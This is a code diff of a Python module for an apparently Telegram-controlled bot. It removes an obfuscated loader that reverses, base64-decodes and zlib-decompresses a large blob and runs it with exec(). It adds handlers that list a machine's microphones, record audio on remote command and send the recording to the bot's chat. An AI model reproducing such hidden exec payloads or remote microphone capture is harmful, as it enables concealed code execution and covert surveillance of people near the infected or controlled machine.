@@ -3,10 +3,137 @@ import constants
 import os
 import pyaudio
 import wave
+import config
+import asyncio
+from command_registry import registry
+from modules import File
+from utils import getarg, getMarkupModes, validate_time_argument, create_menu_markup, send_default_message, send_message
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+async def getdevices_callback(bot, call):
+    markup = getMarkupModes()
+
+    devices = get_devices()
+
+    message = constants.microphonegetdevices_devices_message
+    for i in range(len(devices)):
+        message += f"{i + 1}) {devices[i]['name']}\n"
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
 
 
-exec((_)(b'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'))
+async def record_callback(bot, call):
+    markup = getMarkupModes()
+
+    devices = get_devices()
+
+    message = constants.MICROPHONE_RECORD_documentation.format(
+        max_time_to_record_microphone=config.max_time_to_record_microphone)
+    for i in range(len(devices)):
+        message += f"{i + 1}) {devices[i]['name']}\n"
+
+    await send_message(bot, call.message.chat.id, text=message, reply_markup=markup)
+
+
+@registry.register(
+    command_name=constants.MICROPHONE_RECORD_command,
+    permission_name=constants.MICROPHONE_RECORD,
+)
+async def record(bot, message):
+    arguments = getarg(
+        message.text, constants.MICROPHONE_RECORD_command).split()
+    markup = getMarkupModes()
+
+    device_index, time_working = arguments
+
+    if not len(arguments) == 2 or not (device_index.isdigit() and time_working.isdigit()):
+        await send_message(bot, message.chat.id, text=constants.INVALID_ARGUMENT, reply_markup=markup)
+        return
+
+    device_index, time_working = map(int, arguments)
+
+    await send_message(bot, message.chat.id, text=constants.recordmicrophone_recording_started_message)
+
+    loop = asyncio.get_event_loop()
+    audio_path = await loop.run_in_executor(None, lambda: record_microphone_func(device_index, time_working))
+
+    await send_message(bot, message.chat.id, text=constants.recordmicrophone_recording_finished_message, reply_markup=markup)
+
+    await bot.send_audio(message.chat.id, open(audio_path, 'rb'))
+
+    File.delete_tmp_file(audio_path)
+
+
+def get_devices():
+    p = pyaudio.PyAudio()
+
+    devices_count = p.get_device_count()
+
+    devices = []
+
+    for i in range(p.get_device_count()):
+        device_info = p.get_device_info_by_index(i)
+        if device_info['maxInputChannels'] > 0:
+            devices.append({
+                'name': device_info['name'],
+                'original_index': i,
+                'channels': device_info['maxInputChannels']
+            })
+
+    p.terminate()
+    return devices
+
+
+def record_microphone_func(device_index, time_working):
+    p = pyaudio.PyAudio()
+
+    if not (0 < time_working <= config.max_time_to_record_microphone):
+        raise Exception(constants.INVALID_ARGUMENT)
+
+    devices = get_devices()
+
+    if not (0 < device_index <= len(devices)):
+        raise IndexError(
+            f"Index not in range [1:{len(devices)}].")
+
+    device_info = devices[device_index - 1]
+
+    original_index = device_info['original_index']
+    channels = min(1, device_info['channels'])
+
+    chunk = 1024
+    sample_format = pyaudio.paInt16
+    rate = 44100
+
+    fs = 44100
+    duration = time_working
+    filename = File.get_random_temp_file_name(sample='{file_name}.mp3')
+
+    stream = p.open(format=sample_format,
+                    channels=channels,
+                    rate=rate,
+                    frames_per_buffer=chunk,
+                    input_device_index=original_index,
+                    input=True)
+
+    frames = []
+    for _ in range(0, int(rate / chunk * time_working)):
+        data = stream.read(chunk)
+        frames.append(data)
+
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+
+    wf = wave.open(filename, 'wb')
+    wf.setnchannels(channels)
+    wf.setsampwidth(p.get_sample_size(sample_format))
+    wf.setframerate(fs)
+    wf.writeframes(b''.join(frames))
+    wf.close()
+
+    return filename
+
+
+modes = {constants.MICROPHONE_GETDEVICES_preview: constants.MICROPHONE_GETDEVICES,
+         constants.MICROPHONE_RECORD_preview: constants.MICROPHONE_RECORD}
